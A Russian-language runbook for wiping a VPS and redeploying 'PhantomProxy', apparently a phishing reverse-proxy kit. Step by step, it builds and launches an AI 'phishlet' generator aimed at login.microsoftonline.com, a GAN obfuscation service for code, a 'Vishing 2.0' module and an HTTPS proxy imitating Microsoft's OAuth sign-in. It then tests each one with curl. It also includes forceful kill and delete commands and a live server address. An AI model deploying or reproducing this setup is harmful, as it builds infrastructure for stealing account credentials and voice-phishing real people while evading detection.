# 🧹 ОЧИСТКА VPS И ПЕРЕУСТАНОВКА PHANTOMPROXY

**ВНИМАНИЕ:** Диск заполнен на 91.6%! Нужна очистка.

---

## 🚀 ШАГ 1: ОЧИСТКА (выполни на сервере)

```bash
# Подключение
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147

# Запуск очистки
cd ~
bash cleanup.sh
```

**Или вручную:**

```bash
# 1. Остановить процессы
pkill -9 -f phantom-proxy
pkill -9 -f python3

# 2. Удалить phantom-proxy
rm -rf ~/phantom-proxy

# 3. Очистить кэши
rm -rf ~/.cache/pip
go clean -cache -modcache

# 4. Проверить место
df -h /
```

**Ожидаемый результат:**
```
Usage of /: 50-60% (было 91.6%)
```

---

## 🚀 ШАГ 2: ПЕРЕУСТАНОВКА

После очистки:

```bash
# 1. Создание директории
mkdir -p ~/phantom-proxy
cd ~/phantom-proxy

# 2. Загрузка файлов (с локальной машины)
# На локальной машине выполни:
scp -i "C:\Users\Administrator\.ssh\vk-cloud.pem" -r \
  cmd internal configs go.mod go.sum config.yaml \
  ubuntu@212.233.93.147:~/phantom-proxy/

# 3. Сборка на сервере
go mod tidy
go build -o phantom-proxy ./cmd/phantom-proxy
chmod +x phantom-proxy

# 4. Установка Python зависимостей
for dir in ai ganobf mlopt vishing; do
  cd internal/$dir
  pip3 install -r requirements.txt --break-system-packages
  cd ../..
done

# 5. Запуск сервисов
nohup ./phantom-proxy -config config.yaml > phantom.log 2>&1 &
nohup python3 internal/ai/orchestrator.py > ai.log 2>&1 &
nohup python3 internal/ganobf/main.py > gan.log 2>&1 &
nohup python3 internal/mlopt/main.py > ml.log 2>&1 &
nohup python3 internal/vishing/main.py > vishing.log 2>&1 &

sleep 15

# 6. Проверка
curl http://localhost:8080/health && echo " ✅ Main API"
curl http://localhost:8081/health && echo " ✅ AI"
curl http://localhost:8084/health && echo " ✅ GAN"
curl http://localhost:8083/health && echo " ✅ ML"
curl http://localhost:8082/health && echo " ✅ Vishing"
```

---

## 🚀 ШАГ 3: ПОЛНЫЕ ТЕСТЫ

```bash
cd ~/phantom-proxy

# AI тест
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url":"https://login.microsoftonline.com"}'

# GAN тест
curl -X POST http://localhost:8084/api/v1/gan/obfuscate \
  -H "Content-Type: application/json" \
  -d '{"code":"var x=1;","level":"high"}'

# ML тест
curl -X POST http://localhost:8083/api/v1/ml/train \
  -H "Content-Type: application/json" \
  -d '{"min_samples":10}'

# API статистика
curl http://localhost:8080/api/v1/stats

# HTTPS прокси
curl -k https://localhost:8443/common/oauth2/v2.0/authorize
```

---

## 📊 ОЖИДАЕМЫЕ РЕЗУЛЬТАТЫ

**После очистки:**
```
Usage of /: 50-60% ✅
```

**После установки:**
```
✅ Main API (порт 8080)
✅ AI Orchestrator (порт 8081)
✅ GAN Obfuscation (порт 8084)
✅ ML Optimization (порт 8083)
✅ Vishing 2.0 (порт 8082)
✅ HTTPS Proxy (порт 8443)
```

**Тесты:** Все должны работать ✅

---

## 🐛 ВОЗМОЖНЫЕ ПРОБЛЕМЫ

### 1. "No space left on device"

**Решение:**
```bash
# Очистка apt кэша
sudo apt clean
sudo apt autoremove -y

# Удаление старых ядер
sudo apt purge $(dpkg -l 'linux-image-*' | awk '/^ii/ && $2 !~ /'"$(uname -r | sed "s/\(.*\)-\([0-9]\+\)/\1/")"'"/ {print $2}')
```

### 2. "go: command not found"

**Решение:**
```bash
export PATH=$PATH:/usr/local/go/bin
```

### 3. "Permission denied"

**Решение:**
```bash
chmod +x phantom-proxy
chmod +x *.sh
```

---

## ✅ ЧЕК-ЛИСТ

- [ ] VPS очищен (df -h показывает <70%)
- [ ] Файлы загружены
- [ ] Go бинарник собран
- [ ] Python зависимости установлены
- [ ] Сервисы запущены
- [ ] Все health checks работают
- [ ] Тесты пройдены

---

**После выполнения — отправь скриншоты!** 🚀
